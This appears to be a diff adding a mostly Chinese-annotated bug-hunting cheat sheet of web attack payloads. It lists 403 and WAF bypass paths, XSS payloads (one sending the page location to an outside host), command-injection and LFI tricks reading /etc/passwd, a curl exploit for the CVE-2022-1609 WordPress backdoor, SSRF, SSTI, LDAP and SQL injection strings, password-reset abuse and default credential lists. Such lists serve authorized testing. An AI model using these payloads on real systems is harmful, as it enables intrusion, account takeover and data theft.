@@ -1,0 +1,376 @@
+Bug type: 403 Bypass
+
+site[.]com/env => 403 Forbidden 
+site[.]com/env/HTTPS2 => Bypassed
+GET /admin ==> 403 Forbidden
+GET /blablabal/%2e%2e/admin ==> 200 OK
+GET /blablabal/..;/admin ==> 200 OK 
+GET /blablabal/;/admin ==> 200 OK
+GET /blablabal/admin/..;/ ==> 200 OK
+GET /admin?access=1 ==> 200 OK
+
+
+漏洞挖掘小技巧-身份绕过小技巧,修改XFF头
+Authentication bypass.... 
+X-Forwarded-For: 127.0.0.1
+
+
+API hacking Status: [Dup] Internally known
+Tip: Check endpoint's on different api versions
+1. GET /v2/users or /v2/users.json -> 403
+2. GET /v3/users -> 403
+3. GET /v3/users.json -> 200
+4. GET /v4/users -> 200
+5. POST /v4/users -> 200 [Users created]
+
+
+Cloudfalre XSS Bypass
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+Akamai XSS WAF Bypass
+"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
+
+
+本地文件包含 WAF (Cloudflare) bypass
+../../etc/passwd = 403 Forbidden
+../../etc/random/../passwd = 200 OK
+
+
+
+命令注入
+cat /etc/passwd
+cat /e"t"c/pa"s"swd
+cat /'e'tc/pa's'swd
+cat /etc/pa??wd
+cat /etc/pa*wd
+cat /et``c/passw``d
+cat /et$()c/pa$()sswd
+cat /et${neko}c/pas${poi}swd
+
+
+字典Tips
+/.git/HEAD
+/.git/logs/HEAD
+/.import/
+/.bashrc
+/admin-cgi
+/admin-console
+/backup/
+/console/
+/console/login
+/h2console
+/cgi-bin/admin.cgi
+/jmx-console/
+/portal/
+/portal/login
+/syslog/
+/web-console
+
+
+未授权漏洞挖掘tips
+{“id”:111}⟶ 401 Unauthorized
+{“id”:{“id”:111}} ⟶ 200 OK
+POST /api/get_profile
+Content-Type: application/json {“user_id”:<attacker_id>,”user_id”:<victim’s_id>}
+GET /api_v1/messages?user_id=VICTIM_ID ⟶ 401
+GET /api_v1/messages?user_id=VICTIM_ID ⟶ 401
+GET /api_v1/messages?user_id=attack&user_id=VICTIM ⟶ 200 OK
+
+
+Github黑客语法tips
+User:XXX First Name Last Name
+User:XXX Firstname Lastname
+User:XXX Full Name
+User:XXX Fullname
+
+
+密码重置挖洞Tips
+1-完全删除令牌
+2-将其更改为00000000。。。
+3-使用空/空值
+4-试用过期令牌
+5-尝试一组旧令牌
+6-试试条件竞争
+7-在开始/结束处更改1个字符，以查看是否对标记进行了评估
+8-使用unicode字符juzi欺骗电子邮件地址
+9-尝试victim@email.com&amp;attacker@email.com使用%20或|作为分隔符
+10-尝试用不同的TLD（.eu、.net等）注册同一邮件
+11-不添加域@
+12-尝试sqli旁路和通配符或，%*
+13-请求走私者？
+14-更改请求方法（get、put、post等）和/或内容类型（xml<>json）
+15-匹配不良响应并替换为良好响应
+16-使用超长字符串
+17发送大量token
+18-发送空字段
+19发送-*-*-*-*-“”-*-*-*；*；*-*-*-*-*；*；*-*-*+；***；；*+*+*！*！*+*++*++*；*；*+*+*++*++*；
+
+
+CVE-2022-1609 WordPress Weblizar Backdoor
+curl -s -d 'blowfish=1' -d "blowf=system('id');" 'http://localhost:8888/wp-json/am-member/license'
+
+
+XSS漏洞常见参数
+?q={payload}
+?s={payload}
+?search={payload}
+?id={payload}
+?lang={payload}
+?keyword={payload}
+?query={payload}
+?page={payload}
+?keywords={payload}
+?year={payload}
+?view={payload}
+?email={payload}
+?type={payload}
+?name={payload}
+?p={payload}
+?month={payload}
+?image={payload}
+?list_type={payload}
+?url={payload}
+?terms={payload}
+?categoryid={payload}
+?key={payload}
+?login={payload}
+?begindate={payload}
+?enddate={payload}
+
+
+SSRF漏洞常见参数
+?dest={target}
+?redirect={target}
+?uri={target}
+?path={target}
+?continue={target}
+?url={target}
+?window={target}
+?next={target}
+?data={target}
+?reference={target}
+?site={target}
+?html={target}
+?val={target}
+?validate={target}
+?domain={target}
+?callback={target}
+?return={target}
+?page={target}
+?feed={target}
+?host={target}
+?port={target}
+?to={target}
+?out={target}
+?view={target}
+?dir={target}
+
+SSRF Bypasses
+http://0.0.0.0
+http://0
+http://0x7f000001
+http://2130706433
+http://0000::1
+http://0000::1:25
+http://0000::1:22
+http://0000::1:3128
+http://2130706433
+http://3232235521
+http://3232235777
+http://2852039166
+http://0o177.0.0.1
+
+LFI本地文件包含漏洞常见参数
+?cat={payload}
+?dir={payload}
+?action={payload}
+?board={payload}
+?date={payload}
+?detail={payload}
+?file={payload}
+?download={payload}
+?path={payload}
+?folder={payload}
+?prefix={payload}
+?include={payload}
+?page={payload}
+?inc={payload}
+?locate={payload}
+?show={payload}
+?doc={payload}
+?site={payload}
+?type={payload}
+?view={payload}
+?content={payload}
+?document={payload}
+?layout={payload}
+?mod={payload}
+?conf={payload}
+
+
+SQL注入漏洞常见参数
+?id=
+?page=
+?dir=
+?search=
+?category=
+?file=
+?class=
+?url=
+?news=
+?item=
+?menu=
+?lang=
+?name=
+?ref=
+?title=
+?view=
+?topic=
+?thread=
+?type=
+?date=
+?form=
+?join=
+?main=
+?nav=
+?region=
+
+
+RCE远程代码常见参数
+?cmd=
+?exec=
+?command=
+?execute=
+?ping=
+?query=
+?jump=
+?code=
+?reg=
+?do=
+?func=
+?arg=
+?option=
+?load=
+?process=
+?step=
+?read=
+?function=
+?req=
+?feature=
+?exe=
+?module=
+?payload=
+?run=
+?print=
+
+
+
+URL重定向漏洞常见参数
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+
+
+邮件密码重置漏洞Tips
+在密码重置时尝试多封电子邮件，并检查您的两个电子邮件帐户是否有邮件
+
+🔹 email=victim&email=attacker
+🔹 email[]=victim&email[]=attacker
+🔹 email=victim,attacker
+🔹 {email: victim, email:attacker}
+🔹 {email: [victim,attacker]}
+
+SSTI payloads
+{2*2}[[7*7]]
+{{7*7}}
+{{7*'7'}}
+<%= 7 * 7 %>
+{{ request }}
+{{self}}
+{{dump(app)}}
+#{3*3}
+#{ 3 * 3 }
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{['cat%20/etc/passwd']|filter('system')}}
+
+
+Vue.js Javascript 库客户端模板注入
+[PoC]
+hxxp://host/?name={{this.constructor.constructor('alert("foo")')()}}
+
+
+LDAP injection auth bypasses:)
+1. *
+2. *)(&
+3. *)(|(&
+4. pwd)
+5. *)(|(*
+6. *))%00
+7. admin)(&)
+
+快速检测有无SQL注入
+' OR 1=1--
+' OR 1=0--
+%27%20or%201=1
+*(|(object=*))
+)%20or%20('x'='x
+%20or%201=1
+1) or pg_sleep(__TIME__)--
+/**/or/**/1/**/=1
+' or username like '%
+);waitfor delay '0:0:__TIME__'--
+or isNULL(1/0) /*
+x' or 1=1 or 'x'='y
+
+PHPMyadmin渗透技巧
+当默认凭据在#phpmyadmin登录时不起作用时，我会尝试访问这些路径
+
+admin/phpMyAdmin/setup/index.php
+phpMyAdmin/main.php
+phpmyadmin/pma/
+Admin/setup/index.php
+phpmyadmin/admin/setup/index.php
+phpmyadmin/setup/
+phpmyadmin/setup/index.php
+
+
+
+找到管理员登录口，可以尝试以下账号密码
+admin:admin
+admin:a
+admin:12346578
+test:test
+guest:guest
+anonymous:anonymous
+admin:password
+admin:
+root:toor
+root:passw0rd
+root:root
+guest:test
+$sub_name:password
+ADMIN:ADMIN
+Admin:Admin
+:
+a:a
